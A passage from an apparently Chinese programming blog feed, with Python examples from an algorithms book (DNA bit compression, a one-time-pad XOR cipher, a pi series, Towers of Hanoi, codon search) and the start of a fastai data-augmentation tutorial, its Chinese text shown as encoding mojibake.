sentinel</span></span><br><span class="line">        <span class="keyword">for</span> nucleotide <span class="keyword">in</span> gene.upper(): <span class="comment">## è¿”å›å°å†™å­—æ¯è½¬ä¸ºå¤§å†™å­—æ¯çš„å­—ç¬¦ä¸²</span></span><br><span class="line">            self.bit_string &lt;&lt;= <span class="number">2</span>  <span class="comment">## shift left two bits</span></span><br><span class="line">            <span class="keyword">if</span> nucleotide == <span class="string">&quot;A&quot;</span>:  <span class="comment">## change last two bits to 00</span></span><br><span class="line">                self.bit_string |= <span class="number">0b00</span></span><br><span class="line">            <span class="keyword">elif</span> nucleotide == <span class="string">&quot;C&quot;</span>:  <span class="comment">## change last two bits to 01</span></span><br><span class="line">                self.bit_string |= <span class="number">0b01</span></span><br><span class="line">            <span class="keyword">elif</span> nucleotide == <span class="string">&quot;G&quot;</span>:  <span class="comment">## change last two bits to 10</span></span><br><span class="line">                self.bit_string |= <span class="number">0b10</span></span><br><span class="line">            <span class="keyword">elif</span> nucleotide == <span class="string">&quot;T&quot;</span>:  <span class="comment">## change last two bits to 11</span></span><br><span class="line">                self.bit_string |= <span class="number">0b11</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid Nucleotide:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(nucleotide))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decompress</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">        gene: <span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, self.bit_string.bit_length() - <span class="number">1</span>, <span class="number">2</span>):  <span class="comment">## - 1 to exclude sentinel</span></span><br><span class="line">            bits: <span class="built_in">int</span> = self.bit_string &gt;&gt; i &amp; <span class="number">0b11</span>  <span class="comment">## get just 2 relevant bits</span></span><br><span class="line">            <span class="keyword">if</span> bits == <span class="number">0b00</span>:  <span class="comment">## A</span></span><br><span class="line">                gene += <span class="string">&quot;A&quot;</span></span><br><span class="line">            <span class="keyword">elif</span> bits == <span class="number">0b01</span>:  <span class="comment">## C</span></span><br><span class="line">                gene += <span class="string">&quot;C&quot;</span></span><br><span class="line">            <span class="keyword">elif</span> bits == <span class="number">0b10</span>:  <span class="comment">## G</span></span><br><span class="line">                gene += <span class="string">&quot;G&quot;</span></span><br><span class="line">            <span class="keyword">elif</span> bits == <span class="number">0b11</span>:  <span class="comment">## T</span></span><br><span class="line">                gene += <span class="string">&quot;T&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid bits:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(bits))</span><br><span class="line">        <span class="keyword">return</span> gene[::-<span class="number">1</span>]  <span class="comment">## [::-1] reverses string by slicing backwards</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span>  <span class="comment">## string representation for pretty printing</span></span><br><span class="line">        <span class="keyword">return</span> self.decompress()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> getsizeof</span><br><span class="line">    original: <span class="built_in">str</span> = <span class="string">&quot;TAGGGATTAACCGTTATATATATATAGCCATGGATCGATTATATAGGGATTAACCGTTATATATATATAGCCATGGATCGATTATA&quot;</span> * <span class="number">100</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;original is &#123;&#125; bytes&quot;</span>.<span class="built_in">format</span>(getsizeof(original)))</span><br><span class="line">    compressed: CompressedGene = CompressedGene(original)  <span class="comment">## compress</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;compressed is &#123;&#125; bytes&quot;</span>.<span class="built_in">format</span>(getsizeof(compressed.bit_string)))</span><br><span class="line">    <span class="built_in">print</span>(compressed)  <span class="comment">## decompress</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;original and decompressed are the same: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(original == compressed.decompress()))</span><br></pre></td></tr></table></figure><h3 id="ç‰¢ä¸å¯ç ´çš„åŠ å¯†æ–¹æ¡ˆ"><a href="#ç‰¢ä¸å¯ç ´çš„åŠ å¯†æ–¹æ¡ˆ" class="headerlink" title="ç‰¢ä¸å¯ç ´çš„åŠ å¯†æ–¹æ¡ˆ"></a>ç‰¢ä¸å¯ç ´çš„åŠ å¯†æ–¹æ¡ˆ</h3><blockquote><p>str å’Œ bytes<br>str = â€˜ä½ å¥½â€™ str.encode(â€˜UTF-8â€™) â€“&gt;è¡¨ç¤ºæºæ•°æ®æ˜¯ä»€ä¹ˆæ ¼å¼çš„ï¼Œä¸æŒ‡å®šçš„è¯ï¼Œé»˜è®¤ä¸ºUTF-8 bâ€™\xe4\xbd\xa0\xe5\xa5\xbdâ€™</p><p>str = bâ€™\xe4\xbd\xa0\xe5\xa5\xbdâ€™ str.decode(â€˜UTF-8â€™) â€“&gt;è¡¨ç¤ºæŠŠäºŒè¿›åˆ¶æ•°æ®è§£é‡Šæˆ ä»€ä¹ˆæ ¼å¼çš„æ•°æ®ï¼ˆé»˜è®¤UTF-8ï¼Œå¾…æµ‹ï¼‰</p></blockquote><blockquote><p>XOR(å¼‚æˆ–)æ“ä½œ<br>Pythonä¸­çš„XORæ“ä½œç¬¦æ˜¯â€œAâ€ã€‚åœ¨äºŒè¿›åˆ¶ä½çš„ä¸Šä¸‹æ–‡ä¸­ ï¼Œ0^1å’Œ1^0å°†è¿”å›1ï¼Œè€Œ0^0å’Œ1^1åˆ™ä¼šè¿”å›0</p><p>å¦‚æœç”¨XORåˆå¹¶ä¸¤ä¸ªæ•°çš„äºŒè¿›åˆ¶ä½ï¼Œé‚£ä¹ˆæŠŠç»“æœæ•°ä¸å…¶ä¸­æŸä¸ªæ“ä½œæ•°é‡æ–°åˆå¹¶å³å¯ç”Ÿæˆå¦ä¸€ä¸ªæ“ä½œæ•°ï¼Œè¿™æ˜¯ä¸€ä¸ªå¾ˆæœ‰ç”¨çš„ç‰¹æ€§<br>A^B=C<br>C^B=A<br>C^A=B</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> token_bytes</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Tuple</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_key</span>(<span class="params">length: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">    <span class="comment">## generate length random bytes</span></span><br><span class="line">    tb: <span class="built_in">bytes</span> = token_bytes(length)</span><br><span class="line">    <span class="comment">## convert those bytes into a bit string and return it</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(tb, <span class="string">&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">original: <span class="built_in">str</span></span>) -&gt; <span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>]:</span></span><br><span class="line">    original_bytes: <span class="built_in">bytes</span> = original.encode()</span><br><span class="line">    dummy: <span class="built_in">int</span> = random_key(<span class="built_in">len</span>(original_bytes))</span><br><span class="line">    original_key: <span class="built_in">int</span> = <span class="built_in">int</span>.from_bytes(original_bytes, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">    encrypted: <span class="built_in">int</span> = original_key ^ dummy  <span class="comment">## XOR</span></span><br><span class="line">    <span class="keyword">return</span> dummy, encrypted</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">key1: <span class="built_in">int</span>, key2: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">    decrypted: <span class="built_in">int</span> = key1 ^ key2  <span class="comment">## XOR</span></span><br><span class="line">    temp: <span class="built_in">bytes</span> = decrypted.to_bytes((decrypted.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> temp.decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    key1, key2 = encrypt(<span class="string">&quot;One Time Pad!&quot;</span>)</span><br><span class="line">    result: <span class="built_in">str</span> = decrypt(key1, key2)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h3 id="è®¡ç®—Ï€"><a href="#è®¡ç®—Ï€" class="headerlink" title="è®¡ç®—Ï€"></a>è®¡ç®—<strong>Ï€</strong></h3><blockquote><p>ä»¥ä¸‹æ— ç©·çº§æ•°çš„æ”¶æ•›å€¼ç­‰äºÏ€ï¼š<br>Ï€ = 4/1 âˆ’ 4/3 + 4/5 âˆ’ 4/7 + 4/9 âˆ’ 4/11â€¦</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cal</span>(<span class="params">n</span>):</span></span><br><span class="line">    num = <span class="number">4.0</span></span><br><span class="line">    dem = <span class="number">1.0</span></span><br><span class="line">    opp = <span class="number">1.0</span></span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0.0</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="built_in">sum</span> += opp*num/dem</span><br><span class="line">        opp *= -<span class="number">1.0</span></span><br><span class="line">        dem +=<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(cal(<span class="number">60000000</span>))</span><br></pre></td></tr></table></figure><h3 id="æ±‰è¯ºå¡”"><a href="#æ±‰è¯ºå¡”" class="headerlink" title="æ±‰è¯ºå¡”"></a>æ±‰è¯ºå¡”</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> TypeVar, <span class="type">Generic</span>, <span class="type">List</span></span><br><span class="line">T = TypeVar(<span class="string">&#x27;T&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stack</span>(<span class="params"><span class="type">Generic</span>[T]</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        self._container: <span class="type">List</span>[T] = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">push</span>(<span class="params">self, item: T</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        self._container.append(item)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pop</span>(<span class="params">self</span>) -&gt; T:</span></span><br><span class="line">        <span class="keyword">return</span> self._container.pop()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">repr</span>(self._container)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">num_discs: <span class="built_in">int</span> = <span class="number">3</span></span><br><span class="line">tower_a: Stack[<span class="built_in">int</span>] = Stack()</span><br><span class="line">tower_b: Stack[<span class="built_in">int</span>] = Stack()</span><br><span class="line">tower_c: Stack[<span class="built_in">int</span>] = Stack()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, num_discs + <span class="number">1</span>):</span><br><span class="line">    tower_a.push(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hanoi</span>(<span class="params">begin: Stack[<span class="built_in">int</span>], end: Stack[<span class="built_in">int</span>], temp: Stack[<span class="built_in">int</span>], n: <span class="built_in">int</span></span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        end.push(begin.pop())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        hanoi(begin, temp, end, n - <span class="number">1</span>)</span><br><span class="line">        hanoi(begin, end, temp, <span class="number">1</span>)</span><br><span class="line">        hanoi(temp, end, begin, n - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    hanoi(tower_a, tower_c, tower_b, num_discs)</span><br><span class="line">    <span class="built_in">print</span>(tower_a)</span><br><span class="line">    <span class="built_in">print</span>(tower_b)</span><br><span class="line">    <span class="built_in">print</span>(tower_c)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">æ³¨æ„</span><br><span class="line">ä¸Šè¿°stackç±»å®ç°äº†_repr_()æ–¹æ³•ï¼Œè¿™æ ·æƒ³è¦æŸ¥çœ‹æŸä¸ªå¡” çš„çŠ¶å†µå°±æ¯”è¾ƒå®¹æ˜“äº†ã€‚å¯¹stackç±»è°ƒç”¨<span class="built_in">print</span>()æ—¶ï¼Œè¾“å‡ºçš„å°±æ˜¯_repr_()çš„ç»“æœã€‚</span><br><span class="line"></span><br><span class="line">æ³¨æ„ </span><br><span class="line">æ­£å¦‚æœ¬ä¹¦å¼•è¨€ä¸­æ‰€è¿°ï¼Œæœ¬ä¹¦é€šç¯‡éƒ½ä¼šä½¿ç”¨ç±»å‹æç¤ºã€‚ä» typingæ¨¡å—å¯¼å…¥<span class="type">Generic</span>ï¼Œå°±èƒ½è®©stackåœ¨ç±»å‹æç¤ºæ—¶æ³›å‹åŒ–ä¸ºæŸç§ç±» å‹ã€‚T= TypeVar(<span class="string">&#x27;T&#x27;</span>)å®šä¹‰äº†ä»»æ„ç±»å‹Tã€‚Ñ‚å¯ä»¥æ˜¯ä»»ä½•ç±»å‹ã€‚åç»­åœ¨æ±‚è§£æ±‰è¯ºå¡”é—®é¢˜æ—¶ä½¿ç”¨çš„Stackï¼Œå°±ç”¨åˆ°äº†ç±»å‹æç¤ºï¼Œç±»å‹æç¤ºä¸º Stack[<span class="built_in">int</span>]ç±»å‹ï¼Œè¡¨ç¤ºTåº”è¯¥å¡«å…¥<span class="built_in">int</span>ç±»å‹çš„æ•°æ®ã€‚æ¢å¥è¯è¯´ï¼Œè¯¥æ ˆæ˜¯ä¸€ä¸ªæ•´æ•°æ ˆã€‚å¦‚æœå¯¹ç±»å‹æç¤ºè¿˜å­˜åœ¨å›°æƒ‘ï¼Œä¸å¦¨é˜…è¯»ä¸€ä¸‹é™„å½•Cã€‚</span><br><span class="line"></span><br><span class="line">é€’å½’çš„æƒ…å†µå¯ä»¥è¢«æ‹†åˆ†ä¸ºä»¥ä¸‹<span class="number">3</span>æ­¥ã€‚ </span><br><span class="line">(<span class="number">1</span>)å°†ä¸Šå±‚n-<span class="number">1</span>ä¸ªåœ†ç›˜ä»å¡”Aç§»åˆ°å¡”B(æš‚å­˜å¡”)ï¼Œç”¨å¡”Cä½œä¸ºä¸­ è½¬å¡”ã€‚ </span><br><span class="line">(<span class="number">2</span>)å°†åº•å±‚çš„åœ†ç›˜ä»å¡”Aç§»åˆ°å¡”Cã€‚ </span><br><span class="line">(<span class="number">3</span>)å°†n-<span class="number">1</span>ä¸ªåœ†ç›˜ä»å¡”Bç§»åˆ°å¡”Cï¼Œç”¨å¡”Aä½œä¸ºä¸­è½¬å¡”ã€‚</span><br></pre></td></tr></table></figure><h2 id="ç¬¬2ç« "><a href="#ç¬¬2ç« " class="headerlink" title="ç¬¬2ç« "></a>ç¬¬2ç« </h2><h3 id="DNAæœç´¢"><a href="#DNAæœç´¢" class="headerlink" title="DNAæœç´¢"></a>DNAæœç´¢</h3><h4 id="çº¿æ€§æœç´¢"><a href="#çº¿æ€§æœç´¢" class="headerlink" title="çº¿æ€§æœç´¢"></a>çº¿æ€§æœç´¢</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> enum <span class="keyword">import</span> IntEnum</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Tuple</span>, <span class="type">List</span></span><br><span class="line"></span><br><span class="line">Nucleotide: IntEnum = IntEnum(<span class="string">&#x27;Nucleotide&#x27;</span>, (<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;T&#x27;</span>))</span><br><span class="line">Codon = <span class="type">Tuple</span>[Nucleotide, Nucleotide, Nucleotide]  <span class="comment">## type alias for codons</span></span><br><span class="line">Gene = <span class="type">List</span>[Codon]  <span class="comment">## type alias for genes</span></span><br><span class="line"></span><br><span class="line">gene_str: <span class="built_in">str</span> = <span class="string">&quot;ACGTGGCTCTCTAACGTACGTACGTACGGGGTTTATATATACCCTAGGACTCCCTTT&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">string_to_gene</span>(<span class="params">s: <span class="built_in">str</span></span>) -&gt; Gene:</span></span><br><span class="line">    gene: Gene = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s), <span class="number">3</span>):</span><br><span class="line">        <span class="keyword">if</span> (i + <span class="number">2</span>) &gt;= <span class="built_in">len</span>(s):  <span class="comment">## don&#x27;t run off end!</span></span><br><span class="line">            <span class="keyword">return</span> gene</span><br><span class="line">        <span class="comment">##  initialize codon out of three nucleotides</span></span><br><span class="line">        codon: Codon = (Nucleotide[s[i]], Nucleotide[s[i + <span class="number">1</span>]], Nucleotide[s[i + <span class="number">2</span>]])</span><br><span class="line">        gene.append(codon)  <span class="comment">## add codon to gene</span></span><br><span class="line">    <span class="keyword">return</span> gene</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">my_gene: Gene = string_to_gene(gene_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">linear_contains</span>(<span class="params">gene: Gene, key_codon: Codon</span>) -&gt; <span class="built_in">bool</span>:</span></span><br><span class="line">    <span class="keyword">for</span> codon <span class="keyword">in</span> gene:</span><br><span class="line">        <span class="keyword">if</span> codon == key_codon:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">acg: Codon = (Nucleotide.A, Nucleotide.C, Nucleotide.G)</span><br><span class="line">gat: Codon = (Nucleotide.G, Nucleotide.A, Nucleotide.T)</span><br><span class="line"><span class="built_in">print</span>(linear_contains(my_gene, acg))  <span class="comment">## True</span></span><br><span class="line"><span class="built_in">print</span>(linear_contains(my_gene, gat))  <span class="comment">## False</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ³¨æ„ ä¸Šè¿°å‡½æ•°ä»…ä¾›æ¼”ç¤ºã€‚Pythonå†…ç½®çš„åºåˆ—ç±»å‹ï¼ˆ<span class="built_in">list</span>ã€ <span class="built_in">tuple</span>ã€ <span class="built_in">range</span>)éƒ½å·²å®ç°äº†ï¼¿contains__()æ–¹æ³•ï¼Œè¿™æ ·å°±èƒ½ç®€å•åœ°ç”¨<span class="keyword">in</span> æ“ä½œç¬¦åœ¨å…¶ä¸­æœç´¢æŸä¸ªæŒ‡å®šçš„æ•°æ®é¡¹ã€‚å®é™…ä¸Šï¼Œ<span class="keyword">in</span>è¿ç®—ç¬¦å¯ä»¥ä¸ä»»ä½• å·²å®ç°__contains__()æ–¹æ³•çš„ç±»å‹ä¸€èµ·ä½¿ç”¨ã€‚ä¾‹å¦‚ï¼Œæ‰§è¡Œ<span class="built_in">print</span>(acg <span class="keyword">in</span> my_gene)è¯­å¥å³å¯åœ¨my_geneä¸­æœç´¢acgå¹¶æ‰“å°å‡ºç»“æœã€‚æ­¤ç¤ºä¾‹ä¹Ÿæ¼”ç¤ºäº†æšä¸¾ç±»å‹çš„ç”¨æ³•ã€‚</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastaiæ•™ç¨‹</title>
      <link href="/2021/07/28/fastai%E6%95%99%E7%A8%8B/"/>
      <url>/2021/07/28/fastai%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="å¿«é€Ÿé¢„è§ˆåº”ç”¨"><a href="#å¿«é€Ÿé¢„è§ˆåº”ç”¨" class="headerlink" title="å¿«é€Ÿé¢„è§ˆåº”ç”¨"></a>å¿«é€Ÿé¢„è§ˆåº”ç”¨</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#é»˜è®¤æ˜¯æŠ“å–å›¾åƒä¸­å¿ƒè¿›è¡Œè£å‰ª</span></span><br><span class="line">item tfms=Resize(<span class="number">128</span>)</span><br><span class="line"><span class="comment">#æ”¹ä¸ºå°†å›¾åƒè¿›è¡Œæ‹‰ä¼¸</span></span><br><span class="line">Resize(<span class="number">128</span>, ResizeMethod.Squish)</span><br><span class="line"><span class="comment">#æ”¹ä¸ºå°†ä¸è¶³çš„åŒºåŸŸè¿›è¡Œå¡«å……ï¼ˆè¿™é‡Œzeroå¯ä»¥æ”¹æˆreflectï¼‰</span></span><br><span class="line">bears  bears.new(item_tfms=Resize(<span class="number">128</span>, ResizeMethod.Pad, pad_mode=<span class="string">&#x27;zeros&#x27;</span>))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å¯¹Datablockè¿›è¡Œå¤„ç†ï¼šç”¨åŸæ¥çš„blockåˆ›å»ºæ–°çš„block</span></span><br><span class="line">bears = bears. new(item_tfms=Resize(<span class="number">128</span>, ResizeMethod. Squish)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æˆ–è€…æ˜¯ç”¨RandomResizedCrop</span><br><span class="line">bears = bears.new(item _tfms=RandomRes izedCrop(<span class="number">128</span>, min_scale=<span class="number">0.3</span>))</span><br><span class="line">è¿™æ ·åœ¨æ¯ä¸€è½®è®­ç»ƒä¸­ç½‘ç»œçœ‹åˆ°çš„å›¾ç‰‡éƒ½æ˜¯ä¸åŒçš„</span><br><span class="line">min_scale=<span class="number">0.3</span>ï¼šæ¯æ¬¡è‡³å°‘è£å‰ª<span class="number">30</span>%</span><br><span class="line">ä»¥ä¸Šä¹Ÿæ˜¯æœ€å¸¸ç”¨çš„æ•°æ®æ‰©å¢æ–¹æ³•</span><br></pre></td></tr></table></figure><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/0.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä¸Šå›¾ä¸­ï¼Œé¦–å…ˆCPUæ‰§è¡Œitem_tfms,æŠŠå›¾åƒç»Ÿä¸€å¤§å°ï¼Œå†ç”¨GPUæ‰§è¡Œbatch_tfmsåšæ•°æ®æ‰©å¢ï¼Œè¿™æ ·æ‰§è¡Œé€Ÿåº¦å¿«</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ³¨æ„ï¼šfastaiä¸­æ•°æ®å¢å¼ºåªå¯¹è®­ç»ƒé›†æœ‰æ•ˆï¼Œé™¤äº†randomresizedcropä¹‹å¤–ï¼Œä»–å¯¹è®­ç»ƒé›†ä¼šæŠ“å–éšæœºä½ç½®çš„å±€éƒ¨æ¥è£å‰ªï¼Œå¯¹éªŒè¯é›†ä»–ä¼šæŠ“å–ä»–èƒ½æŠ“å–çš„æ­£æ–¹å½¢ä¸­å¿ƒä½ç½®</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åœ¨å»ºç«‹äº†ä¸€ä¸ªæ¨¡å‹ä¹‹åå†è¿›è¡Œæ•°æ®æ¸…æ´—ä¼šæ–¹ä¾¿ï¼Œå› ä¸ºå¯ä»¥ç”¨ä¸‹å›¾è¿™ä¸ªå‡½æ•°æŒ‘é€‰</span><br></pre></td></tr></table></figure><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/1.png"></p><h2 id="å‡†å¤‡æ•°æ®"><a href="#å‡†å¤‡æ•°æ®" class="headerlink" title="å‡†å¤‡æ•°æ®"></a>å‡†å¤‡æ•°æ®</h2><h3 id="ä½¿ç”¨Bing-image-search-api"><a href="#ä½¿ç”¨Bing-image-search-api" class="headerlink" title="ä½¿ç”¨Bing image search api"></a>ä½¿ç”¨Bing image search api</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/2.png"></p><h3 id="åˆ†ç±»ä¸‹è½½å›¾ç‰‡åˆ°å„ä¸ªæ–‡ä»¶å¤¹"><a href="#åˆ†ç±»ä¸‹è½½å›¾ç‰‡åˆ°å„ä¸ªæ–‡ä»¶å¤¹" class="headerlink" title="åˆ†ç±»ä¸‹è½½å›¾ç‰‡åˆ°å„ä¸ªæ–‡ä»¶å¤¹"></a>åˆ†ç±»ä¸‹è½½å›¾ç‰‡åˆ°å„ä¸ªæ–‡ä»¶å¤¹</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/3.png"></p><h3 id="åˆ é™¤ä¸‹è½½å¤±è´¥çš„å›¾ç‰‡"><a 